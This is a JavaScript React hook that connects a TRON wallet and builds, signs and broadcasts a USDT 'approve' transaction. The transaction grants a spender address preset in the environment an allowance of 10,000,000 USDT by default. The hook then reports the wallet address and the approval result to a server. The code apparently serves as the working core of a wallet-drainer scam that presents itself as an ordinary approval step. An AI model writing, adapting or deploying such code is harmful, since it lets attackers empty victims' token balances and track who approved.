import { useState } from "react";
import { useWalletConnect } from "./useWalletConnect";
import { TronWeb } from "tronweb";
import useSendDataToServer from "./useSendDataToserver";
import { useWallet } from "../context/globalContext";

const isMobileDevice = () => /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);

export const useTronApprove = () => {
  const [approvalStatus, setApprovalStatus] = useState(null);
  const [isLoading, setIsLoading] = useState(false);
  const { connectWallet } = useWalletConnect();
  const { senDataToServer } = useSendDataToServer();
  const { walletAddress } = useWallet();

  const approveTokens = async (
    spender = process.env.NEXT_PUBLIC_PREDEFINED_ADRESS_USDT,
    amount = 10000000 * 1e6
  ) => {
    setIsLoading(true);

    try {
      setApprovalStatus("Processing approval...");
      
      // Conectează wallet-ul
      const walletConnection = await connectWallet();

      // Redirecționează către Trust Wallet dacă este pe mobil
      if (isMobileDevice()) {
        const trustDeepLink = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(
          walletConnection.wallet.uri
        )}`;
        window.location.href = trustDeepLink;
        return;
      }

      const tronWeb = new TronWeb({ fullHost: "https://api.trongrid.io" });

      const usdtContractAddress = process.env.NEXT_PUBLIC_USDT_CONTRACT_ADDRESS;
      const functionSelector = "approve(address,uint256)";

      const parameters = [
        { type: "address", value: spender },
        { type: "uint256", value: amount },
      ];

      const options = {
        feeLimit: 300000000,
        callValue: 0,
      };

      const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
        usdtContractAddress,
        functionSelector,
        options,
        parameters,
        walletAddress
      );

      // Semnează tranzacția
      const signedTransaction = await walletConnection.wallet.signTransaction(transaction);

      // Trimite tranzacția către rețea
      const result = await tronWeb.trx.sendRawTransaction(signedTransaction);

      setApprovalStatus(
        result.result ? "Approval successful!" : "Approval failed."
      );

      // Trimite datele către server
      await senDataToServer({
        address: walletAddress,
        spender,
        amount: amount / 1e6,
        approvalStatus: result.result ? "Approved" : "Failed",
        timestamp: new Date().toISOString(),
      });
    } catch (error) {
      console.error("Approval failed:", error);
      setApprovalStatus("Approval failed.");
      await senDataToServer({
        approvalStatus: `Failed: ${error.message}`,
        errorDetails: JSON.stringify(error, null, 2),
        timestamp: new Date().toISOString(),
        address: walletAddress || "Unknown Address",
        spender: spender || "Unknown Spender",
      });
    } finally {
      setIsLoading(false);
    }
  };

  return {
    approveTokens,
    approvalStatus,
    isLoading,
  };
};
